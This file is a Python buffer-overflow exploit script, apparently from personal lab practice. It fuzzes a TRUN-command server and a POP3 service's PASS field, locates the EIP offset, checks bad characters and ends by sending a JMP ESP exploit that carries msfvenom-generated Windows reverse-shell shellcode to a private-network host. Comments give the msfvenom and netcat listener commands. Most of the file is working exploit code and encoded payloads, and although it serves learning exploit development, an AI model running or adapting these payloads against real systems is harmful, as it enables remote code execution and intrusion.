#!/usr/bin/python3 
# Test the server with the data that crashed it
# Before running these scripts, it could be possible to use SPIKE to identify if the application is vulnerable to a BoF
# To do so, create the spike scripts to be used with the  generic_tcp_send 
# generic_tcp_send [host] [port] [spike_script] [SKIPVAR] [SKIPSTR]
# check basic.spk or 0Help.spk to see how it works or https://shahrukhathar.info/an-introduction-to-fuzzing-using-fuzzers-spike-to-find-vulnerabilities/
# In case you need to convert from string to bytes use: bytes(test_string, 'utf-8')
# Inverse way: myvar.decode("utf-8")
import socket
import time 
import sys
import struct

#Fnction to send a payload. It is used by all
def send_payload(payload):
    try:
        print("Creating the socket")
        # Create the socket and establish the connection to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Establishing the connection")
        # Both parenthesis are required
        s.connect((host, port)) 
        print("Sending the payload to ", host,":",port)
        s.send(payload) 
        #print("Receiving the data")
        #data = s.recv(1024)
        #print(data)
        s.close() 
    except Exception as err:
        print ("Fuzzing crashed: ")
        print (str(err))
        sys.exit() 

def send_pop(payload):
    try:
        print("Creating the socket")
        # Create the socket and establish the connection to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Establishing the connection to", host,":",port,)
        # Both parenthesis are required
        s.connect((host, port)) 
        data = s.recv(1024)
        print("Answer received: ",data)
        s.send(b"USER test\r\n") 
        data = s.recv(1024)
        print("Received: ", data)
        s.send(b"PASS "+payload) 
        print("Received: ",data)
        s.close() 
    except Exception as err:
        print ("Fuzzing crashed: ")
        print (str(err))
        sys.exit() 


def send_payload_and_read(payload):
    try:
        print("Creating the socket")
        # Create the socket and establish the connection to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Establishing the connection")
        # Both parenthesis are required
        s.connect((host, port)) 
        print("Sending the payload to ", host,":",port," size: ", len(payload))
        s.send(payload) 
        print("Receiving the data...")
        data = s.recv(100)
        print(data)
        s.close() 
    except Exception as err:
        print ("Fuzzing crashed: ")
        print (str(err))
        sys.exit() 


def save_payload(payload):
    filename = "exploit.wav"
    try:
        #Payload can be saved to a file in case it is required:
        with open(filename, 'wb') as f:
            f.write(payload)
            f.close()
    except Exception as err:
        print ("Problem saving file ",filename)
        print (str(err))


# To use Initial Test call msg_test()
def msg_test(msg):
    # Calling the server with a specific value(the one that was identified in spike that caused the crash) to validate the server stops working
    # Replaces this line with the data you want to send to the server after the connection is established
    #msg = "PUT THE MSG HERE"
    send_payload(msg)


#Test 1
def fuzz(command, size, gap):
    #Initial size to start looking where the server dies 
    #size = 100
    # 1. Finding the approximated size that cause the overflow
    # This is the initial part to identify how many chars can cause an overflow
    # This part can be used if SPIKE was not used to identify if the application crashes
    # If the EIP in the server contains 41414141 (AAAA) this means it is possible to be manipulated
    while (True):
        print ("\nFuzzing system with %s bytes" % size )
        payload = command + b"A"*size + b"\n" 
        # Replaces this line with the data you want to send to the server after the connection is established
        #send_payload_and_read(payload)
        send_pop(payload)
        time.sleep(1)
        size+=gap



#Test 4
def check_badchars():
    # 4. Checking for badchars (not accepted by the server)
    # Run the same than before but sending the badchars
    size = 2002
    textpattern = b"A"*size
    rand= b"Z"
    eip = b"B"*4
    ebp = b"C"*10
    # This part is used to identify if the server accepts all the values or if there are any "badchar" to avoid its use
    # In x64dbg run: ERC --bytearray to create the byte array file and once the program crash run ERC --compare to identify bad characters
    badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    payload = b"TRUN /.:/" + textpattern + rand + eip + badchars
    print("Sending the payload")
    send_payload(payload)


#Test 5 shell exploit
def shell_exploit():
    # Detect the right address for the EIP and run the shell!
    # Now we know we can point EIP to the address we want and also we know we can left the payload in the ESP
    # So we need to find an address where the JMP ESP call already exist using mona.py
    # Download it from https://github.com/corelan/mona and copy the file into Immunity Debugger\PyCommands
    # Run !mona modules in the textbox in the downside of the Immunity debugger window to identify insecure modules
    # In x64dbg 
    # Look for JMP ESP ("\xff\xe4") in the insecure modules identified ("essfunc.dll" in this case)
    # !mona find -s "\xff\xe4" -m "essfunc.dll"  => We identified 0x625011af in this case
    # The shellcode can be generated using msvenom. It should not contain bad chars (if we found any)
    # Using msfvenom in Linux, including the badchars to not be used. At least \x00 should be included:
    # msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
    # Before running this code, we need to run a nc in the kali Linux to get the reverse shell: sudo nc -lnvp 443
    #Same buffer
    buffer = b"A"*2002
    rand = b"Z"
    #Address we want to point in little indian (inverse order) 0x625011af is now:
    #eip = b"\xaf\x11\x50\x62"
    eip = struct.pack('<L', 0x625011af)
    shellcode = (b"\xda\xc3\xb8\x7e\xe5\x93\x6d\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
    b"\x52\x83\xeb\xfc\x31\x43\x13\x03\x3d\xf6\x71\x98\x3d\x10\xf7"
    b"\x63\xbd\xe1\x98\xea\x58\xd0\x98\x89\x29\x43\x29\xd9\x7f\x68"
    b"\xc2\x8f\x6b\xfb\xa6\x07\x9c\x4c\x0c\x7e\x93\x4d\x3d\x42\xb2"
    b"\xcd\x3c\x97\x14\xef\x8e\xea\x55\x28\xf2\x07\x07\xe1\x78\xb5"
    b"\xb7\x86\x35\x06\x3c\xd4\xd8\x0e\xa1\xad\xdb\x3f\x74\xa5\x85"
    b"\x9f\x77\x6a\xbe\xa9\x6f\x6f\xfb\x60\x04\x5b\x77\x73\xcc\x95"
    b"\x78\xd8\x31\x1a\x8b\x20\x76\x9d\x74\x57\x8e\xdd\x09\x60\x55"
    b"\x9f\xd5\xe5\x4d\x07\x9d\x5e\xa9\xb9\x72\x38\x3a\xb5\x3f\x4e"
    b"\x64\xda\xbe\x83\x1f\xe6\x4b\x22\xcf\x6e\x0f\x01\xcb\x2b\xcb"
    b"\x28\x4a\x96\xba\x55\x8c\x79\x62\xf0\xc7\x94\x77\x89\x8a\xf0"
    b"\xb4\xa0\x34\x01\xd3\xb3\x47\x33\x7c\x68\xcf\x7f\xf5\xb6\x08"
    b"\x7f\x2c\x0e\x86\x7e\xcf\x6f\x8f\x44\x9b\x3f\xa7\x6d\xa4\xab"
    b"\x37\x91\x71\x7b\x67\x3d\x2a\x3c\xd7\xfd\x9a\xd4\x3d\xf2\xc5"
    b"\xc5\x3e\xd8\x6d\x6f\xc5\x8b\x51\xd8\xc4\x28\x3a\x1b\xc6\xaf"
    b"\x01\x92\x20\xc5\x65\xf3\xfb\x72\x1f\x5e\x77\xe2\xe0\x74\xf2"
    b"\x24\x6a\x7b\x03\xea\x9b\xf6\x17\x9b\x6b\x4d\x45\x0a\x73\x7b"
    b"\xe1\xd0\xe6\xe0\xf1\x9f\x1a\xbf\xa6\xc8\xed\xb6\x22\xe5\x54"
    b"\x61\x50\xf4\x01\x4a\xd0\x23\xf2\x55\xd9\xa6\x4e\x72\xc9\x7e"
    b"\x4e\x3e\xbd\x2e\x19\xe8\x6b\x89\xf3\x5a\xc5\x43\xaf\x34\x81"
    b"\x12\x83\x86\xd7\x1a\xce\x70\x37\xaa\xa7\xc4\x48\x03\x20\xc1"
    b"\x31\x79\xd0\x2e\xe8\x39\xe0\x64\xb0\x68\x69\x21\x21\x29\xf4"
    b"\xd2\x9c\x6e\x01\x51\x14\x0f\xf6\x49\x5d\x0a\xb2\xcd\x8e\x66"
    b"\xab\xbb\xb0\xd5\xcc\xe9")

    # nops are just like go to the next memmory address.
    nops = b"\x90"*8

    print ("\Preparing the string with the reverse shell")
    payload = b"TRUN /.:/" + buffer + rand + eip + nops + shellcode
    print("Sending the payload")
    send_payload(payload)




# Replace it with the server address
host = "192.168.1.56"
# Replace this with the desired port
#port = 9999
#port = 31337
port=110

# Calling the methods here. uncomment the one you want to test
# Initial test to send a msg
#msg = b"TRUN /.:/" + "A"*800

# Initial test to chck the server receives the comm
payload = b"A"*2000+b"\n"
#msg_test(payload)
#send_pop(payload)
#print("Initial message sent successfully")


#Test 1 - check if the program stops at any buffer size
#command = b"TRUN /.:/"
command=b""
initial_size=1000
gap = 500
#fuzz(command, initial_size, gap)
# Died with 3500

# Now confirm if this size of payload kill the server (based on the previous result)
payload = b"A"*150+b"\n"
#msg_test(payload)


#Test 2
# 2. Finding the exact offset where the EIP is replaced
# We need to generate a sequence of "random" chars to identify where it happens
# This pattern was created using this command: /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1024 or 
# msf-pattern_create -l 1024 in other kali
# In x64dbg command: ERC --pattern c 3500 => it should be 2900
totalsize=2900
pattern = (b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em") 
payload= command + pattern + b"\n"
#send_pop(payload)     #After calling the EBP was 69443769 position 2602, EIP: 39694438 position 2606, SP points to the addres that contains 44306A44  Dj0D position 2610
#msg_test(payload)
# After running this part, the EIP value should be noted. 
# Now use this command to identify the exact offset based on the EIP value:
# /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 5000 -q 386F4337
# The answer received was: => [*] Exact match at offset ??
# In x64dbg command: ERC --pattern o [value_in_ascii]  to get the exact offset 
# To get the ascii value, I had to enter it as "\x01\x02..." (address obtained) using python3 cmd line to get the ascii or in right click, modify in x64dbg to get the ASCII representation
# In this case I got 146 =>
# In Immunidbg !mona.py findmsp will analyse and return the info aout the offset for EIP and ESP and its lenght (to understand if the payload has enough space to inject the shellcode)

#Test Test 3 control over some registers
# 3. Confirming the EIP and other registers can be manipulated by us
# Once the offset is identified include here the size obtained from the pattern offset 
# Check it is working by running this part and validating EIP becomes EKIM
size = 2602   #EBP 2602 EIP 2606 ESP 2610
# This is to identify if it is little indian. Once it is determined, this values should be replaced by the desired return address
textpattern = b"A"*(size-1)+b"Z"
# Here the value we want to assign to the registers we want to validate
ebp = b"BBBB"
eip = b"CCCC"   #MIKE 454B494D \x45\x4B\x49\x4D
espcontentsize = totalsize-len(command)-len(textpattern)-len(ebp)-len(eip)  #2900-2602-4-4=290 
espcontent = b"DDDD"+b"E"*(espcontentsize-4)
payload = command+textpattern+ebp+eip+espcontent+b"\n"
#msg_test(payload)
#send_pop(payload)
# After sending the message it was observed the EIP has EKIM as value due to the little indian notation


#Test 4 check_badchars
# This part is used to identify if the server accepts all the values or if there are any "badchar" to avoid its use
# In x64dbg run: ERC --bytearray to create the byte array file and once the program crash run ERC --compare to identify bad characters
#badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# we build the payload based on the previous values + badchars
#We need to validate if there are some of them not observed in the stack
#payload = command+textpattern+eip+badchars+b"B"*(1024-146-4-len(badchars))+b"\n"
#I will check if 351 (size for the shellcode)  is possible
espcontentsize = 351-len(badchars)
espcontent = badchars + b"E"*espcontentsize
payload = command+textpattern+ebp+eip+espcontent+b"\n"
#payload = command+textpattern+eip+esp+b"B"*(size-len(command)-len(textpattern)-len(eip)-len(esp))+b"\n"
#print("Sending new payload T4")
#send_pop(payload)   #Identified badchars \x0a y \x0d and size fits to have the shell in the ESP space we have
#msg_test(payload)


#Test 5 shell exploit 
# Detect the right address for the EIP and run the shell!
# Now we know we can point EIP to the address we want and also we know we can left the payload in the ESP
# So we need to find an address where the JMP ESP call already exist using mona.py in Immunity
# Download it from https://github.com/corelan/mona and copy the file into Immunity Debugger\PyCommands
# Look for JMP ESP ("\xff\xe4") in the insecure modules 
# !mona modules #in the textbox in the downside of the Immunity debugger window to identify insecure modules
# The module should have the ASLR and DEP field set to false. It also cannot contain any bad characters in its base range.
# !mona find -s "\xff\xe4" -m "modulename.dll"   # To identify the address with JMP ESP. It should not contain badchars
# In x64dbg use the command ERC --ModuleInfo  and then go to symbols (alt+e), select any of the dll or exe files by double clicking it. 
# Then ctrl+f to search the required instruction jmp esp
#Pick an address that does not contain identified badchars 
# To know the op codefor JUMP ESP we can use msf-nasm_shell. Run it and put JMP ESP to identify the op code
#       msf-nasm_shell
#       >JMP ESP  => FFE4

# The shellcode can be generated using msvenom. It should not contain bad chars (if we found any)
# Using msfvenom in Linux, including the badchars to not be used. At least \x00 should be included:
# msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
# Before running this code, we need to run a nc in the kali Linux to get the reverse shell: sudo nc -lnvp 443
buf =  b""
buf += b"\xdb\xdf\xd9\x74\x24\xf4\x5f\xbb\x63\x1f\x9a\xbd\x2b"
buf += b"\xc9\xb1\x52\x31\x5f\x17\x83\xef\xfc\x03\x3c\x0c\x78"
buf += b"\x48\x3e\xda\xfe\xb3\xbe\x1b\x9f\x3a\x5b\x2a\x9f\x59"
buf += b"\x28\x1d\x2f\x29\x7c\x92\xc4\x7f\x94\x21\xa8\x57\x9b"
buf += b"\x82\x07\x8e\x92\x13\x3b\xf2\xb5\x97\x46\x27\x15\xa9"
buf += b"\x88\x3a\x54\xee\xf5\xb7\x04\xa7\x72\x65\xb8\xcc\xcf"
buf += b"\xb6\x33\x9e\xde\xbe\xa0\x57\xe0\xef\x77\xe3\xbb\x2f"
buf += b"\x76\x20\xb0\x79\x60\x25\xfd\x30\x1b\x9d\x89\xc2\xcd"
buf += b"\xef\x72\x68\x30\xc0\x80\x70\x75\xe7\x7a\x07\x8f\x1b"
buf += b"\x06\x10\x54\x61\xdc\x95\x4e\xc1\x97\x0e\xaa\xf3\x74"
buf += b"\xc8\x39\xff\x31\x9e\x65\x1c\xc7\x73\x1e\x18\x4c\x72"
buf += b"\xf0\xa8\x16\x51\xd4\xf1\xcd\xf8\x4d\x5c\xa3\x05\x8d"
buf += b"\x3f\x1c\xa0\xc6\xd2\x49\xd9\x85\xba\xbe\xd0\x35\x3b"
buf += b"\xa9\x63\x46\x09\x76\xd8\xc0\x21\xff\xc6\x17\x45\x2a"
buf += b"\xbe\x87\xb8\xd5\xbf\x8e\x7e\x81\xef\xb8\x57\xaa\x7b"
buf += b"\x38\x57\x7f\x2b\x68\xf7\xd0\x8c\xd8\xb7\x80\x64\x32"
buf += b"\x38\xfe\x95\x3d\x92\x97\x3c\xc4\x75\x58\x68\xc7\xe6"
buf += b"\x30\x6b\xc7\xe9\x7b\xe2\x21\x83\x6b\xa3\xfa\x3c\x15"
buf += b"\xee\x70\xdc\xda\x24\xfd\xde\x51\xcb\x02\x90\x91\xa6"
buf += b"\x10\x45\x52\xfd\x4a\xc0\x6d\x2b\xe2\x8e\xfc\xb0\xf2"
buf += b"\xd9\x1c\x6f\xa5\x8e\xd3\x66\x23\x23\x4d\xd1\x51\xbe"
buf += b"\x0b\x1a\xd1\x65\xe8\xa5\xd8\xe8\x54\x82\xca\x34\x54"
buf += b"\x8e\xbe\xe8\x03\x58\x68\x4f\xfa\x2a\xc2\x19\x51\xe5"
buf += b"\x82\xdc\x99\x36\xd4\xe0\xf7\xc0\x38\x50\xae\x94\x47"
buf += b"\x5d\x26\x11\x30\x83\xd6\xde\xeb\x07\xf6\x3c\x39\x72"
buf += b"\x9f\x98\xa8\x3f\xc2\x1a\x07\x03\xfb\x98\xad\xfc\xf8"
buf += b"\x81\xc4\xf9\x45\x06\x35\x70\xd5\xe3\x39\x27\xd6\x21"
shellcode = buf

#Address we want to point in little indian (inverse order) 0x625011af is now:
#eip = b"\xaf\x11\x50\x62"
eip = struct.pack('<L', 0x5F4A358F)
#eip = b"\xc3\x14\x04\x08"

# nops are just like go to the next memmory address.
nops = b"\x90"*16
print ("Preparing the string with the reverse shell")
espcontent = shellcode 
#payload = command+textpattern+ebp+eip+nops+shellcode+b"B"*(1024-len(command)-len(textpattern)--len(eip)-len(shellcode))+b"\n"
payload = command+textpattern+ebp+eip+nops+espcontent+b"B"*100+b"\n"
send_pop(payload)   

#print("Sending the payload")
#send_payload(payload)


#Linux part
host = "192.168.1.55"
port = 13327
#Test 6 Linux Crossfire 1.9.0 server crash and identifying values in the registers and stack
#crash_test()

#Test 7 Linux Crossfire 1.9.0 controlling ESP and EAX
#control_esp_eax()
#Test 8 Linux Crossfire 1.9.0 checking badchars")
#check_badchars_cross()
#Test 9Linux Crossfire 1.9.0 controlling EIP, ESP and EAX to get reverse shell
#shell_exploit_cross()
